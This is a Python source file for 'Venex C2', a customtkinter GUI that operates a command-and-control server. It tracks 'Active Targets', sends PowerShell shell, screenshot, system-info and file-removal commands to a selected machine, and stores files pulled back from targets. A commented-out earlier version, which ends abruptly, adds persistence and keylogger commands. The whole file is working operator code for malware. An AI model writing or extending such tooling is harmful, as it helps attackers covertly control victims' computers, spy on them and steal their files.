import base64
import hashlib
import socket
import threading
import time
import tkinter as tk
from tkinter import messagebox, filedialog, ttk
import customtkinter as ctk
from datetime import datetime, timedelta
from queue import Queue
import re
import ipaddress
import os
import subprocess
import platform
import shutil

# --- Premium Windows 11 Styling ---
ctk.set_appearance_mode("Dark")
ctk.set_default_color_theme("blue")

# Color Palette
ACCENT_BLUE = "#0078d4"
ACCENT_HOVER = "#005a9e"
BG_DARK = "#202020"
CARD_DARK = "#2b2b2b"
TEXT_PRIMARY = "#ffffff"
TEXT_SECONDARY = "#a0a0a0"
SUCCESS_GREEN = "#22DD22"
DANGER_RED = "#d13438"

class PremiumC2Client(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.protocol("WM_DELETE_WINDOW", self.on_close)
        
        # defult hash token
        self.sha256_token = "NONE"

        # create configeration directory and files if not exist
        self.config_dir = "config"
        self.config_file = os.path.join(self.config_dir, "venex_client.vconf")
        
        # Window configuration
        self.title("Venex C2 - Windows 11 Edition")
        self.geometry("1400x900")
        self.minsize(1100, 750)
        self.configure(fg_color=BG_DARK)

        # Logic Variables
        self.server_ip = tk.StringVar(value="")
        self.server_port = tk.IntVar(value=7777)
        self.auth_token = tk.StringVar(value="")
        self.connected = False
        self.socket = None
        self.targets = {}
        self.target_lock = threading.Lock()
        self.interacting_with_target = None
        self.gui_queue = Queue()
        self.content_box_path = os.path.join(os.getcwd(), "content_box")
        self.current_path = self.content_box_path
        if not os.path.exists(self.content_box_path):
            os.makedirs(self.content_box_path)

        # === AUTOCOMPLETE COMMAND LISTS ===
        self.global_commands = ["AUTH:STOP_HTTP", "AUTH:START_HTTP"]
        self.target_commands = ["shell powershell -command \"", "$sysinfo", "rmf" , "print", "$screenShot"]
        
        self.current_commands = self.global_commands  # default mode

        # Setup UI
        self.setup_premium_ui()

        # Initialize config
        self.init_config()

        # Background processes
        self.cleanup_thread = threading.Thread(target=self.cleanup_old_targets, daemon=True)
        self.cleanup_thread.start()
        self.after(100, self.process_gui_updates)
        self.refresh_file_explorer()


    def setup_premium_ui(self):
        self.grid_columnconfigure(1, weight=1)
        self.grid_rowconfigure(0, weight=1)

        # --- Sidebar Navigation ---
        self.sidebar = ctk.CTkFrame(self, width=260, corner_radius=0, fg_color="#1a1a1a")
        self.sidebar.grid(row=0, column=0, rowspan=2, sticky="nsew")
        self.sidebar.grid_rowconfigure(4, weight=1)

        # Logo
        self.logo_label = ctk.CTkLabel(self.sidebar, text="VENEX C2", font=ctk.CTkFont(size=24, weight="bold"))
        self.logo_label.grid(row=0, column=0, padx=30, pady=(40, 30))

        # Nav Buttons
        self.btn_dashboard = self.create_nav_button("Dashboard", "📊", 1, self.show_dashboard)
        self.btn_content = self.create_nav_button("Content Box", "📁", 2, self.show_content)
        self.btn_settings = self.create_nav_button("Settings", "⚙️", 3, self.show_settings)

        # Sidebar Footer
        self.status_indicator = ctk.CTkLabel(self.sidebar, text="● Disconnected", text_color=DANGER_RED, font=ctk.CTkFont(size=12))
        self.status_indicator.grid(row=5, column=0, padx=30, pady=(0, 20), sticky="w")

        # --- Main Content Area ---
        self.main_area = ctk.CTkFrame(self, corner_radius=20, fg_color=BG_DARK)
        self.main_area.grid(row=0, column=1, sticky="nsew", padx=30, pady=30)
        self.main_area.grid_columnconfigure(0, weight=1)
        self.main_area.grid_rowconfigure(1, weight=1)

        # Top Bar (Connection)
        self.top_bar = ctk.CTkFrame(self.main_area, fg_color="transparent")
        self.top_bar.grid(row=0, column=0, sticky="ew", pady=(0, 20))
        
        conn_card = ctk.CTkFrame(self.top_bar, fg_color=CARD_DARK, corner_radius=12, height=70)
        conn_card.pack(fill="x")
        
        ctk.CTkLabel(conn_card, text="Server:", font=ctk.CTkFont(weight="bold")).pack(side="left", padx=(20, 5))
        self.ip_entry = ctk.CTkEntry(conn_card, textvariable=self.server_ip, width=150, border_width=0, fg_color="#3d3d3d")
        self.ip_entry.pack(side="left", padx=5, pady=15)
        
        ctk.CTkLabel(conn_card, text="Port:", font=ctk.CTkFont(weight="bold")).pack(side="left", padx=(15, 5))
        self.port_entry = ctk.CTkEntry(conn_card, textvariable=self.server_port, width=80, border_width=0, fg_color="#3d3d3d")
        self.port_entry.pack(side="left", padx=5, pady=15)

        self.connect_btn = ctk.CTkButton(conn_card, text="Connect", command=self.toggle_connection, 
                                        fg_color=ACCENT_BLUE, hover_color=ACCENT_HOVER, corner_radius=8, width=120, font=ctk.CTkFont(weight="bold"))
        self.connect_btn.pack(side="right", padx=20, pady=15)

        # Views Container
        self.views = {}
        self.setup_dashboard_view()
        self.setup_content_view()
        self.setup_settings_view()
        
        self.show_dashboard()

        # --- Bottom Command Bar ---
        self.cmd_bar = ctk.CTkFrame(self, height=120, fg_color="#1a1a1a", corner_radius=0)
        self.cmd_bar.grid(row=1, column=1, sticky="ew")
        self.cmd_bar.grid_columnconfigure(0, weight=1)

        self.mode_label = ctk.CTkLabel(self.cmd_bar, text="MODE: C2 SERVER", font=ctk.CTkFont(size=11, weight="bold"), text_color=TEXT_SECONDARY)
        self.mode_label.grid(row=0, column=0, padx=30, pady=(15, 0), sticky="w")

        cmd_input_container = ctk.CTkFrame(self.cmd_bar, fg_color="transparent")
        cmd_input_container.grid(row=1, column=0, sticky="ew", padx=30, pady=(5, 20))
        cmd_input_container.grid_columnconfigure(0, weight=1)

        self.cmd_entry = ctk.CTkEntry(cmd_input_container, placeholder_text="Type a command (e.g., help, interact ID)...", 
                                     height=45, corner_radius=10, border_width=1, border_color="#3d3d3d", fg_color="#252525")
        self.cmd_entry.grid(row=0, column=0, sticky="ew", padx=(0, 15))
        self.cmd_entry.bind("<Return>", self.send_command)

        self.send_btn = ctk.CTkButton(cmd_input_container, text="Execute", command=self.send_command, 
                                     width=100, height=45, corner_radius=10, fg_color=ACCENT_BLUE)
        self.send_btn.grid(row=0, column=1)

        # === AUTOCOMPLETE SETUP ===
        self.internal_entry = self.cmd_entry._entry
        self.internal_entry.configure(
            selectbackground="#252525",
            selectforeground="#cccccc"    # bright ghost text
        )

        self.internal_entry.bind("<KeyRelease>", self.on_key_release)
        self.internal_entry.bind("<BackSpace>", self.on_backspace)
        self.internal_entry.bind("<Tab>", self.on_tab)
        self.internal_entry.bind("<Right>", self.on_right_arrow)
        self.internal_entry.bind("<Return>", lambda e: self.send_command())

    def create_nav_button(self, text, icon, row, command):
        btn = ctk.CTkButton(self.sidebar, text=f"  {icon}  {text}", anchor="w", height=45, 
                           fg_color="transparent", hover_color="#2d2d2d", corner_radius=8,
                           font=ctk.CTkFont(size=14), command=command)
        btn.grid(row=row, column=0, padx=20, pady=5, sticky="ew")
        return btn

    def setup_dashboard_view(self):
        view = ctk.CTkFrame(self.main_area, fg_color="transparent")
        self.views["dashboard"] = view
        view.grid_columnconfigure(0, weight=2)
        view.grid_columnconfigure(1, weight=1)
        view.grid_rowconfigure(0, weight=1)

        # Left: Targets & Output
        left_col = ctk.CTkFrame(view, fg_color="transparent")
        left_col.grid(row=0, column=0, sticky="nsew", padx=(0, 20))
        left_col.grid_columnconfigure(0, weight=1)
        left_col.grid_rowconfigure(0, weight=1)
        left_col.grid_rowconfigure(1, weight=1)

        # Targets Card
        target_card = ctk.CTkFrame(left_col, fg_color=CARD_DARK, corner_radius=15)
        target_card.grid(row=0, column=0, sticky="nsew", pady=(0, 20))
        target_card.grid_columnconfigure(0, weight=1)
        target_card.grid_rowconfigure(1, weight=1)
        
        ctk.CTkLabel(target_card, text="Active Targets", font=ctk.CTkFont(size=16, weight="bold")).grid(row=0, column=0, padx=20, pady=15, sticky="w")
        
        # Custom Treeview Styling
        style = ttk.Style()
        style.theme_use("clam")
        style.configure("Treeview", background=CARD_DARK, foreground=TEXT_PRIMARY, fieldbackground=CARD_DARK, borderwidth=0, rowheight=40)
        style.map("Treeview", background=[('selected', ACCENT_BLUE)])
        
        self.targets_tree = ttk.Treeview(target_card, columns=("id", "last", "status"), show="headings")
        self.targets_tree.heading("id", text="TARGET ID")
        self.targets_tree.heading("last", text="LAST SEEN")
        self.targets_tree.heading("status", text="STATUS")
        self.targets_tree.grid(row=1, column=0, sticky="nsew", padx=15, pady=(0, 15))
        
        self.target_menu = tk.Menu(self, tearoff=0, bg=CARD_DARK, fg=TEXT_PRIMARY, borderwidth=0)
        self.target_menu.add_command(label="Interact", command=self.interact_with_target)
        self.targets_tree.bind("<Button-3>", self.show_target_menu)

        # Output Card
        output_card = ctk.CTkFrame(left_col, fg_color=CARD_DARK, corner_radius=15)
        output_card.grid(row=1, column=0, sticky="nsew")
        output_card.grid_columnconfigure(0, weight=1)
        output_card.grid_rowconfigure(1, weight=1)
        
        ctk.CTkLabel(output_card, text="Terminal Output", font=ctk.CTkFont(size=16, weight="bold")).grid(row=0, column=0, padx=20, pady=15, sticky="w")
        self.output_text = ctk.CTkTextbox(output_card, fg_color="#1a1a1a", text_color=SUCCESS_GREEN, font=("Consolas", 13), corner_radius=10)
        self.output_text.grid(row=1, column=0, sticky="nsew", padx=15, pady=(0, 15))

        # Right: Logs
        log_card = ctk.CTkFrame(view, fg_color=CARD_DARK, corner_radius=15)
        log_card.grid(row=0, column=1, sticky="nsew")
        log_card.grid_columnconfigure(0, weight=1)
        log_card.grid_rowconfigure(1, weight=1)
        
        ctk.CTkLabel(log_card, text="System Logs", font=ctk.CTkFont(size=16, weight="bold")).grid(row=0, column=0, padx=20, pady=15, sticky="w")
        self.log_text = ctk.CTkTextbox(log_card, fg_color="#1a1a1a", text_color=TEXT_SECONDARY, font=("Segoe UI", 11), corner_radius=10)
        self.log_text.grid(row=1, column=0, sticky="nsew", padx=15, pady=(0, 15))




    def setup_content_view(self):
        view = ctk.CTkFrame(self.main_area, fg_color="transparent")
        self.views["content"] = view
        view.grid_columnconfigure(0, weight=1)
        view.grid_rowconfigure(1, weight=1)

        # Explorer Card
        explorer_card = ctk.CTkFrame(view, fg_color=CARD_DARK, corner_radius=15)
        explorer_card.grid(row=0, column=0, rowspan=2, sticky="nsew")
        explorer_card.grid_columnconfigure(0, weight=1)
        explorer_card.grid_rowconfigure(1, weight=1)

        # Toolbar
        toolbar = ctk.CTkFrame(explorer_card, fg_color="transparent")
        toolbar.grid(row=0, column=0, sticky="ew", padx=20, pady=15)
        
        self.path_entry = ctk.CTkEntry(toolbar, fg_color="#3d3d3d", border_width=0, height=35)
        self.path_entry.pack(side="left", fill="x", expand=True, padx=(0, 10))
        
        ctk.CTkButton(toolbar, text="Refresh", width=80, height=35, command=self.refresh_file_explorer).pack(side="left", padx=5)
        ctk.CTkButton(toolbar, text="Up", width=60, height=35, command=self.go_up_directory).pack(side="left", padx=5)
        ctk.CTkButton(toolbar, text="Delete", width=80, height=35, fg_color=DANGER_RED, hover_color="#a4262c", command=self.delete_selected_file).pack(side="left", padx=5)

        # Files Tree
        self.files_tree = ttk.Treeview(explorer_card, columns=("name", "size", "type", "mod"), show="headings")
        self.files_tree.heading("name", text="NAME")
        self.files_tree.heading("size", text="SIZE")
        self.files_tree.heading("type", text="TYPE")
        self.files_tree.heading("mod", text="MODIFIED")
        self.files_tree.grid(row=1, column=0, sticky="nsew", padx=20, pady=(0, 20))
        self.files_tree.bind("<Double-1>", self.on_file_double_click)

    def setup_settings_view(self):
        view = ctk.CTkFrame(self.main_area, fg_color=CARD_DARK, corner_radius=15)
        self.views["settings"] = view
        
        ctk.CTkLabel(view, text="Settings", font=ctk.CTkFont(size=24, weight="bold")).pack(padx=40, pady=(40, 20), anchor="w")
        
        # Appearance
        ctk.CTkLabel(view, text="Appearance Mode", font=ctk.CTkFont(weight="bold")).pack(padx=40, pady=(20, 5), anchor="w")
        self.theme_opt = ctk.CTkOptionMenu(view, values=["Dark", "Light", "System"], command=lambda m: ctk.set_appearance_mode(m))
        self.theme_opt.pack(padx=40, pady=10, anchor="w")
        
        # Token
        ctk.CTkLabel(view, text="Authentication Token", font=ctk.CTkFont(weight="bold")).pack(padx=40, pady=(20, 5), anchor="w")
        self.token_entry_set = ctk.CTkEntry(view, textvariable=self.auth_token, width=300, show="*")
        self.token_entry_set.pack(padx=40, pady=10, anchor="w")

    def show_dashboard(self): self.switch_view("dashboard", self.btn_dashboard)
    def show_content(self): self.switch_view("content", self.btn_content)
    def show_settings(self): self.switch_view("settings", self.btn_settings)

    def switch_view(self, name, btn):
        for v in self.views.values(): v.grid_forget()
        self.views[name].grid(row=1, column=0, sticky="nsew")
        
        for b in [self.btn_dashboard, self.btn_content, self.btn_settings]:
            b.configure(fg_color="transparent", text_color=TEXT_PRIMARY)
        btn.configure(fg_color=ACCENT_BLUE, text_color="white")

    # --- Core Logic (Restored from Original) ---

    def toggle_connection(self):
        if not self.connected: self.connect_to_server()
        else: self.disconnect_from_server()


    def read_config(self, key):
        try:
            with open(self.config_file, "r") as f:
                lines = f.readlines()
                for line in lines:
                    if line.startswith(f"{key}="):
                        return line.split("=", 1)[1].strip()
        except FileNotFoundError:
            return ""
        
        return ""
    
    def save_config(self, key, value):
        lines = []
        found = False
        try:
            with open(self.config_file, "r") as f:
                lines = f.readlines()
            for i, line in enumerate(lines):
                if line.startswith(f"{key}="):
                    lines[i] = f"{key}={value}\n"
                    found = True
                    break
            if not found:
                lines.append(f"{key}={value}\n")
            with open(self.config_file, "w") as f:
                f.writelines(lines)
        except FileNotFoundError:
            with open(self.config_file, "w") as f:
                f.write(f"{key}={value}\n")

    def init_config(self):
        if not os.path.exists(self.config_dir):
            os.makedirs(self.config_dir)
        if not os.path.exists(self.config_file):
            with open(self.config_file, "w") as f:
                f.write("# Venex C2 Client Configuration\n")
            return
        # if config file exists, fill variables
        self.server_ip.set(self.read_config("server_ip"))
        self.server_port.set(int(self.read_config("server_port")))

    def connect_to_server(self):
        host = self.server_ip.get()
        try:
            ip = host if self.is_ip(host) else socket.gethostbyname(host)
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((ip, self.server_port.get()))
            self.connected = True
            
            # Auth
            if not self.auth_token.get():
                token = self.read_config("auth_token")
                if token == "":
                    self.log_message("Error", "Authentication token not set. Please set it in Settings.")
                    self.socket.close()
                    self.connected = False
                    return
                self.sha256_token = token
            else:
                self.sha256_token = hashlib.sha256(self.auth_token.get().encode('utf-8')).hexdigest()

            self.socket.sendall(f"TOKEN:{self.sha256_token}".encode("utf-8"))

            self.connect_btn.configure(text="Disconnect", fg_color=DANGER_RED)
            self.status_indicator.configure(text="● Connected", text_color=SUCCESS_GREEN)
            
            threading.Thread(target=self.receive_messages, daemon=True).start()
            self.log_message(f"Connected to {ip}")
        except Exception as e:
            messagebox.showerror("Error", f"Connection failed: {e}")

    def disconnect_from_server(self):
        self.connected = False
        if self.socket: self.socket.close()
        self.connect_btn.configure(text="Connect", fg_color=ACCENT_BLUE)
        self.status_indicator.configure(text="● Disconnected", text_color=DANGER_RED)
        self.log_message("Disconnected")
        self.switch_to_normal_mode()
        with self.target_lock:
            self.targets.clear()
            self.gui_queue.put((self._clear_targets_tree, ()))

    def send_command(self, event=None):
        cmd = self.cmd_entry.get()
        if not cmd or not self.connected: return
        try:
            f_cmd = f"TARGET:{self.interacting_with_target}:{cmd}" if self.interacting_with_target else cmd
            self.socket.sendall((f_cmd + "\n").encode())
            self.cmd_entry.delete(0, tk.END)
            self.log_message(f"Sent: {f_cmd}")
        except Exception as e: self.log_message(f"Error: {e}")

    def receive_messages(self):
        buffer = b""
        while self.connected:
            try:
                data = self.socket.recv(4096)
                if not data: break
                buffer += data
                while b"END_OF" in buffer:
                    line, buffer = buffer.split(b"END_OF", 1)
                    if line.strip(): self.process_message(line.strip())
            except: break
        self.gui_queue.put((self.disconnect_from_server, ()))

    def process_message(self, message):
        if message.startswith(b"TARGET:"):
            self.add_target(message[7:].strip().decode('utf-8'))
        elif message.startswith(b"/DATA:"):
            text = message[6:].decode('utf-8')
            self.gui_queue.put((self.log_data_message, (f"$$-> {text}",)))
        elif message.startswith(b"/WRITE:"):
             # Remove the command prefix
            payload = message[len(b"/WRITE:"):]

            # Split only the first two ':' so binary data stays intact
            filename, extension, file_data = payload.split(b":", 2)

            # Convert filename and extension from bytes to string
            filename = filename.decode("utf-8")
            extension = extension.decode("utf-8")

            # Build full file path
            full_filename = f"content_box/{filename}.{extension}"

            base, ext = os.path.splitext(full_filename)
            counter = 1

            new_filename = full_filename

            while os.path.exists(new_filename):
                new_filename = f"{base}_{counter}{ext}"
                counter += 1

            with open(new_filename, "wb") as f:
                f.write(file_data)

            self.gui_queue.put((self.log_message, (f"$$-> Received file: {full_filename} saved",)))


        else:
            self.gui_queue.put((self.log_message, (f"← {message.decode(errors='ignore')}",)))

    def add_target(self, tid):
        with self.target_lock:
            if tid not in self.targets:
                self.targets[tid] = {"last": datetime.now(), "status": "Active"}
                self.gui_queue.put((self._add_target_to_tree, (tid,)))
            else:
                self.targets[tid]["last"] = datetime.now()
                self.gui_queue.put((self._update_target_in_tree, (tid,)))

    def _add_target_to_tree(self, tid):
        self.targets_tree.insert("", "end", values=(tid, datetime.now().strftime("%H:%M:%S"), "Active"))

    def _update_target_in_tree(self, tid):
        for item in self.targets_tree.get_children():
            if self.targets_tree.item(item, "values")[0] == tid:
                self.targets_tree.item(item, values=(tid, datetime.now().strftime("%H:%M:%S"), "Active"))

    def _clear_targets_tree(self):
        for i in self.targets_tree.get_children(): self.targets_tree.delete(i)

    def show_target_menu(self, event):
        item = self.targets_tree.identify_row(event.y)
        if item:
            self.targets_tree.selection_set(item)
            self.target_menu.post(event.x_root, event.y_root)

    def interact_with_target(self):
        sel = self.targets_tree.selection()
        if sel:
            tid = self.targets_tree.item(sel[0], "values")[0]
            self.interacting_with_target = tid
            self.mode_label.configure(text=f"MODE: INTERACTING WITH {tid}", text_color=ACCENT_BLUE)
            self.log_message(f"Interacting with {tid}")
            self.current_commands = self.target_commands

    def switch_to_normal_mode(self):
        self.interacting_with_target = None
        self.mode_label.configure(text="MODE: C2 SERVER", text_color=TEXT_SECONDARY)
        self.log_message("Switched to normal mode")
        self.current_commands = self.global_commands

    def log_message(self, msg):
        ts = datetime.now().strftime("%H:%M:%S")
        self.log_text.insert(tk.END, f"[{ts}] {msg}\n")
        self.log_text.see(tk.END)

    def log_data_message(self, msg):
        self.output_text.insert(tk.END, f"{msg}\n")
        self.output_text.see(tk.END)

    # --- File Explorer Logic ---
    def refresh_file_explorer(self):
        for i in self.files_tree.get_children(): self.files_tree.delete(i)
        self.path_entry.delete(0, tk.END); self.path_entry.insert(0, self.current_path)
        try:
            for item in os.listdir(self.current_path):
                p = os.path.join(self.current_path, item)
                s = os.stat(p)
                mod = datetime.fromtimestamp(s.st_mtime).strftime("%Y-%m-%d %H:%M")
                if os.path.isdir(p): self.files_tree.insert("", "end", values=(f"📁 {item}", "--", "Folder", mod))
                else: self.files_tree.insert("", "end", values=(f"📄 {item}", f"{s.st_size/1024:.1f} KB", "File", mod))
        except: pass

    def on_file_double_click(self, e):
        sel = self.files_tree.selection()
        if not sel: return
        name = self.files_tree.item(sel[0])['values'][0][2:]
        path = os.path.join(self.current_path, name)
        if os.path.isdir(path): self.current_path = path; self.refresh_file_explorer()
        else: self.open_file(path)

    def go_up_directory(self):
        self.current_path = os.path.dirname(self.current_path)
        self.refresh_file_explorer()

    def open_file(self, p):
        try:
            if platform.system() == 'Windows': os.startfile(p)
            else: subprocess.run(['xdg-open', p])
        except: pass

    def delete_selected_file(self):
        sel = self.files_tree.selection()
        if not sel: return
        name = self.files_tree.item(sel[0])['values'][0][2:]
        path = os.path.join(self.current_path, name)
        if messagebox.askyesno("Confirm", f"Delete {name}?"):
            try:
                if os.path.isdir(path): shutil.rmtree(path)
                else: os.remove(path)
                self.refresh_file_explorer()
            except: pass

    def is_ip(self, s):
        try: ipaddress.ip_address(s); return True
        except: return False

    def cleanup_old_targets(self):
        while True:
            time.sleep(30)
            if not self.connected: continue
            now = datetime.now()
            with self.target_lock:
                to_remove = [tid for tid, info in self.targets.items() if now - info["last"] > timedelta(minutes=5)]
                for tid in to_remove:
                    del self.targets[tid]
                    self.gui_queue.put((self._remove_target_from_tree, (tid,)))
            if to_remove and self.interacting_with_target in to_remove:
                self.gui_queue.put((self.switch_to_normal_mode, ()))

    def _remove_target_from_tree(self, tid):
        for item in self.targets_tree.get_children():
            if self.targets_tree.item(item, "values")[0] == tid:
                self.targets_tree.delete(item)
                break

    def process_gui_updates(self):
        while not self.gui_queue.empty():
            func, args = self.gui_queue.get()
            func(*args)
        self.after(100, self.process_gui_updates)

    # === AUTOCOMPLETE LOGIC ===
    def clear_ghost(self):
        try:
            self.internal_entry.selection_clear()
        except tk.TclError:
            pass

    def update_suggestion(self):
        # We don't clear ghost here anymore because it's handled by selection management
        actual_text = self.cmd_entry.get()

        # If there's a selection, the "actual text" is what's before the selection
        if self.internal_entry.selection_present():
            sel_start = self.internal_entry.index("sel.first")
            actual_text = actual_text[:sel_start]

        if not actual_text: # or " " in actual_text:
            return

        lower_text = actual_text.lower()
        matches = [cmd for cmd in self.current_commands if cmd.lower().startswith(lower_text)]
        
        if not matches:
            return

        # Find the best match (shortest one that starts with the text)
        suggestion = min(matches, key=len)

        # If the suggestion is exactly what we typed, no need to show it as a ghost
        if suggestion.lower() == lower_text:
            return

        # Update the entry: keep what user typed, append the rest as selected text
        self.cmd_entry.delete(0, tk.END)
        self.cmd_entry.insert(0, suggestion)
        
        typed_len = len(actual_text)
        self.internal_entry.icursor(typed_len)
        self.internal_entry.selection_range(typed_len, tk.END)

    def on_key_release(self, event):
        # Ignore navigation and control keys
        if event.keysym in {"Tab", "Return", "Left", "Right", "Up", "Down", 
                           "Shift_L", "Shift_R", "Control_L", "Control_R", 
                           "BackSpace", "Escape", "Caps_Lock", "space"}:
            return
        
        self.update_suggestion()

    def on_backspace(self, event):
        if self.internal_entry.selection_present():
            # If ghost text is present, backspace should just remove the ghost text
            # and then let the default backspace handle the last character of actual text
            sel_start = self.internal_entry.index("sel.first")
            self.cmd_entry.delete(sel_start, tk.END)
            self.internal_entry.icursor(sel_start)
            # We don't return "break" here, so the default backspace deletes the char before sel_start
            # But we need to update suggestions after that happens
            self.after(1, self.update_suggestion)
            return
        
        # Standard backspace: just update suggestions after the character is deleted
        self.after(1, self.update_suggestion)

    def on_tab(self, event):
        if self.internal_entry.selection_present():
            # Accept the suggestion
            self.internal_entry.icursor(tk.END)
            self.internal_entry.selection_clear()
            return "break"
        return "break"

    def on_right_arrow(self, event):
        if self.internal_entry.selection_present():
            # Accept the suggestion
            self.internal_entry.icursor(tk.END)
            self.internal_entry.selection_clear()
            return "break"
        
    def on_close(self):

        if self.auth_token.get():
            self.save_config("auth_token", self.sha256_token)
        if self.server_ip.get():
            self.save_config("server_ip", self.server_ip.get())
        if self.server_port.get():
            self.save_config("server_port", str(self.server_port.get()))
        
        # Close socket if connected
        if self.connected:
            self.connected = False
            if self.socket:
                self.socket.close()
        self.destroy()



if __name__ == "__main__":
    app = PremiumC2Client()
    app.mainloop()


# import base64
# import hashlib
# import socket
# import threading
# import time
# import tkinter as tk
# from tkinter import messagebox, filedialog, ttk
# import customtkinter as ctk
# from datetime import datetime, timedelta
# from queue import Queue
# import re
# import ipaddress
# import os
# import subprocess
# import platform
# import shutil

# # --- Premium Windows 11 Styling ---
# ctk.set_appearance_mode("Dark")
# ctk.set_default_color_theme("blue")

# # Color Palette
# ACCENT_BLUE = "#0078d4"
# ACCENT_HOVER = "#005a9e"
# BG_DARK = "#202020"
# CARD_DARK = "#2b2b2b"
# TEXT_PRIMARY = "#ffffff"
# TEXT_SECONDARY = "#a0a0a0"
# SUCCESS_GREEN = "#22DD22"
# DANGER_RED = "#d13438"

# class PremiumC2Client(ctk.CTk):
#     def __init__(self):
#         super().__init__()
#         # Window configuration
#         self.title("Venex C2 - Windows 11 Edition")
#         self.geometry("1400x900")
#         self.minsize(1100, 750)
#         self.configure(fg_color=BG_DARK)

#         # Logic Variables
#         self.server_ip = tk.StringVar(value="127.0.0.1")
#         self.server_port = tk.IntVar(value=7777)
#         self.auth_token = tk.StringVar(value="your token")
#         self.connected = False
#         self.socket = None
#         self.targets = {}
#         self.target_lock = threading.Lock()
#         self.interacting_with_target = None
#         self.gui_queue = Queue()
#         self.content_box_path = os.path.join(os.getcwd(), "content_box")
#         self.current_path = self.content_box_path
#         if not os.path.exists(self.content_box_path):
#             os.makedirs(self.content_box_path)

#         # === AUTOCOMPLETE COMMAND LISTS ===
#         self.global_commands = ["help", "interact", "targets", "clear", "list", "exit"]
#         self.target_commands = ["back", "sysinfo", "screenshot", "shell", "upload", "download",
#                                "pwd", "ls", "cd", "persist", "keylog_start", "keylog_stop", "help"]
#         self.current_commands = self.global_commands  # default mode

#         # Setup UI
#         self.setup_premium_ui()

#         # Background processes
#         self.cleanup_thread = threading.Thread(target=self.cleanup_old_targets, daemon=True)
#         self.cleanup_thread.start()
#         self.after(100, self.process_gui_updates)
#         self.refresh_file_explorer()

#     def setup_premium_ui(self):
#         self.grid_columnconfigure(1, weight=1)
#         self.grid_rowconfigure(0, weight=1)

#         # --- Sidebar Navigation ---
#         self.sidebar = ctk.CTkFrame(self, width=260, corner_radius=0, fg_color="#1a1a1a")
#         self.sidebar.grid(row=0, column=0, rowspan=2, sticky="nsew")
#         self.sidebar.grid_rowconfigure(4, weight=1)

#         # Logo
#         self.logo_label = ctk.CTkLabel(self.sidebar, text="VENEX C2", font=ctk.CTkFont(size=24, weight="bold"))
#         self.logo_label.grid(row=0, column=0, padx=30, pady=(40, 30))

#         # Nav Buttons
#         self.btn_dashboard = self.create_nav_button("Dashboard", "📊", 1, self.show_dashboard)
#         self.btn_content = self.create_nav_button("Content Box", "📁", 2, self.show_content)
#         self.btn_settings = self.create_nav_button("Settings", "⚙️", 3, self.show_settings)

#         # Sidebar Footer
#         self.status_indicator = ctk.CTkLabel(self.sidebar, text="● Disconnected", text_color=DANGER_RED, font=ctk.CTkFont(size=12))
#         self.status_indicator.grid(row=5, column=0, padx=30, pady=(0, 20), sticky="w")

#         # --- Main Content Area ---
#         self.main_area = ctk.CTkFrame(self, corner_radius=20, fg_color=BG_DARK)
#         self.main_area.grid(row=0, column=1, sticky="nsew", padx=30, pady=30)
#         self.main_area.grid_columnconfigure(0, weight=1)
#         self.main_area.grid_rowconfigure(1, weight=1)

#         # Top Bar (Connection)
#         self.top_bar = ctk.CTkFrame(self.main_area, fg_color="transparent")
#         self.top_bar.grid(row=0, column=0, sticky="ew", pady=(0, 20))

#         conn_card = ctk.CTkFrame(self.top_bar, fg_color=CARD_DARK, corner_radius=12, height=70)
#         conn_card.pack(fill="x")

#         ctk.CTkLabel(conn_card, text="Server:", font=ctk.CTkFont(weight="bold")).pack(side="left", padx=(20, 5))
#         self.ip_entry = ctk.CTkEntry(conn_card, textvariable=self.server_ip, width=150, border_width=0, fg_color="#3d3d3d")
#         self.ip_entry.pack(side="left", padx=5, pady=15)

#         ctk.CTkLabel(conn_card, text="Port:", font=ctk.CTkFont(weight="bold")).pack(side="left", padx=(15, 5))
#         self.port_entry = ctk.CTkEntry(conn_card, textvariable=self.server_port, width=80, border_width=0, fg_color="#3d3d3d")
#         self.port_entry.pack(side="left", padx=5, pady=15)

#         self.connect_btn = ctk.CTkButton(conn_card, text="Connect", command=self.toggle_connection,
#                                         fg_color=ACCENT_BLUE, hover_color=ACCENT_HOVER, corner_radius=8, width=120, font=ctk.CTkFont(weight="bold"))
#         self.connect_btn.pack(side="right", padx=20, pady=15)

#         # Views Container
#         self.views = {}
#         self.setup_dashboard_view()
#         self.setup_content_view()
#         self.setup_settings_view()

#         self.show_dashboard()

#         # --- Bottom Command Bar ---
#         self.cmd_bar = ctk.CTkFrame(self, height=120, fg_color="#1a1a1a", corner_radius=0)
#         self.cmd_bar.grid(row=1, column=1, sticky="ew")
#         self.cmd_bar.grid_columnconfigure(0, weight=1)

#         self.mode_label = ctk.CTkLabel(self.cmd_bar, text="MODE: C2 SERVER", font=ctk.CTkFont(size=11, weight="bold"), text_color=TEXT_SECONDARY)
#         self.mode_label.grid(row=0, column=0, padx=30, pady=(15, 0), sticky="w")

#         cmd_input_container = ctk.CTkFrame(self.cmd_bar, fg_color="transparent")
#         cmd_input_container.grid(row=1, column=0, sticky="ew", padx=30, pady=(5, 20))
#         cmd_input_container.grid_columnconfigure(0, weight=1)

#         self.cmd_entry = ctk.CTkEntry(cmd_input_container, placeholder_text="Type a command (e.g., help, interact ID)...",
#                                      height=45, corner_radius=10, border_width=1, border_color="#3d3d3d", fg_color="#252525")
#         self.cmd_entry.grid(row=0, column=0, sticky="ew", padx=(0, 15))
#         self.cmd_entry.configure(font=("Consolas", 13))

#         self.send_btn = ctk.CTkButton(cmd_input_container, text="Execute", command=self.send_command,
#                                      width=100, height=45, corner_radius=10, fg_color=ACCENT_BLUE)
#         self.send_btn.grid(row=0, column=1)

#         # === AUTOCOMPLETE SETUP ===
#         self.internal_entry = self.cmd_entry._entry
#         self.internal_entry.configure(
#             selectbackground="#252525",
#             selectforeground="#cccccc"    # bright ghost text
#         )

#         self.internal_entry.bind("<KeyRelease>", self.on_key_release)
#         self.internal_entry.bind("<BackSpace>", self.on_backspace)
#         self.internal_entry.bind("<Tab>", self.on_tab)
#         self.internal_entry.bind("<Right>", self.on_right_arrow)
#         self.internal_entry.bind("<Return>", lambda e: self.send_command())

#     def create_nav_button(self, text, icon, row, command):
#         btn = ctk.CTkButton(self.sidebar, text=f" {icon} {text}", anchor="w", height=45,
#                            fg_color="transparent", hover_color="#2d2d2d", corner_radius=8,
#                            font=ctk.CTkFont(size=14), command=command)
#         btn.grid(row=row, column=0, padx=20, pady=5, sticky="ew")
#         return btn

#     def setup_dashboard_view(self):
#         view = ctk.CTkFrame(self.main_area, fg_color="transparent")
#         self.views["dashboard"] = view
